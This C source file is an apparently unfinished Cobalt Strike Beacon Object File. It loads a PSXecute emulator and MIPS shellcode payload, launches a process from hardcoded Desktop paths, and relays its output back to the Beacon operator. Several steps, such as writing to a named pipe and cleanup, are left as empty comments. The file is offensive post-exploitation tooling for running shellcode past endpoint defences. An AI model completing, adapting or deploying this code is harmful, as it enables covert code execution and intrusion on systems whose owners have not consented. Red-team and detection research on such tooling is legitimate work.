#include "beacon.h"
#include <windows.h>

/* Declarations for DFR */
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(
  IN LPCSTR lpApplicationName,
  IN OUT LPSTR lpCommandLine,
  IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
  IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
  IN BOOL bInheritHandles,
  IN DWORD dwCreationFlags,
  IN LPVOID lpEnvironment,
  IN LPCSTR lpCurrentDirectory,
  IN LPSTARTUPINFOA lpStartupInfo,
  OUT LPPROCESS_INFORMATION lpProcessInformation
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(
  IN HANDLE hObject
);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(
  IN HANDLE hHandle,
  IN DWORD dwMilliseconds
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreatePipe(
  OUT PHANDLE hReadPipe,
  OUT PHANDLE hWritePipe,
  IN LPSECURITY_ATTRIBUTES lpPipeAttributes,
  IN DWORD nSize
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(
  IN HANDLE hFile,
  OUT LPVOID lpBuffer,
  IN DWORD nNumberOfBytesToRead,
  OUT LPDWORD lpNumberOfBytesRead,
  IN OUT LPOVERLAPPED lpOverlapped
);

/*BOF Entry Point*/
void go(char* args, int length) {
    // Parse inputs; get PSXecute.exe and payload
    datap parser;
	BeaconDataParse(&parser, args, length);

    int psxecuteSize = 0;
    char* pPsxecuteContents = BeaconDataExtract(&parser, &psxecuteSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d bytes PSXecute.exe loaded in memory\n", psxecuteSize);

    int payloadSize = 0;
    char* pPayload = BeaconDataExtract(&parser, &payloadSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d bytes MIPS-I 32-bit shellcode loaded in memory\n", payloadSize);

    // Write process executable to named pipe
    

    // Create anonymous pipe to capture STDOUT from process
    SECURITY_ATTRIBUTES secAttr = {0};
    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRead = NULL;
    HANDLE hStdoutWrite = NULL;

    if (!KERNEL32$CreatePipe(&hStdoutRead, &hStdoutWrite, &secAttr, 0)) return;
    if (hStdoutRead == NULL || hStdoutWrite == NULL) return;


    // Launch process
    STARTUPINFOA startupInfo = {0};
    startupInfo.cb = sizeof(STARTUPINFOA);
    startupInfo.hStdOutput = hStdoutWrite;
    startupInfo.hStdError = hStdoutWrite;
    startupInfo.dwFlags |= STARTF_USESTDHANDLES;

    PROCESS_INFORMATION processInformation = {0};

    if(KERNEL32$CreateProcessA(
        "C:\\Users\\captainwoof\\Desktop\\PSXecute-works.exe", // Image path
        "\"C:\\Users\\captainwoof\\Desktop\\PSXecute-works.exe\" C:\\Users\\captainwoof\\Desktop\\notepad.bin", // Command line
        NULL,
        NULL,
        TRUE,
        0, // Creation flags
        NULL, // Environment variables
        NULL, // Current directory
        &startupInfo,
        &processInformation
    )) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[+] PSXecute VM launched; PID: %d, TID: %d; capturing output...\n",
            processInformation.dwProcessId,
            processInformation.dwThreadId
        );

        // Read process's STDOUT
        DWORD dwRead = 0;
        CHAR chBuf[100] = "";
        BOOL bSuccess = FALSE;

        KERNEL32$CloseHandle(hStdoutWrite);
        while(TRUE)
        {
            // Capture child's STDOUT and redirect it to Parent's STDOUT
            bSuccess = KERNEL32$ReadFile(hStdoutRead, chBuf, 100, &dwRead, NULL);
            if (!bSuccess || dwRead == 0) break;

            BeaconOutput(
                CALLBACK_OUTPUT,
                chBuf,
                dwRead
            );
        }

        // Wait for VM to exit
        KERNEL32$WaitForSingleObject(processInformation.hThread, INFINITE);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", "[+] PSXecute VM exited");

        // Close process handles
        KERNEL32$CloseHandle(hStdoutRead);
        KERNEL32$CloseHandle(processInformation.hThread);
        KERNEL32$CloseHandle(processInformation.hProcess);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] PSXecute VM failed to launch\n");
    };

    // Cleanup
    
}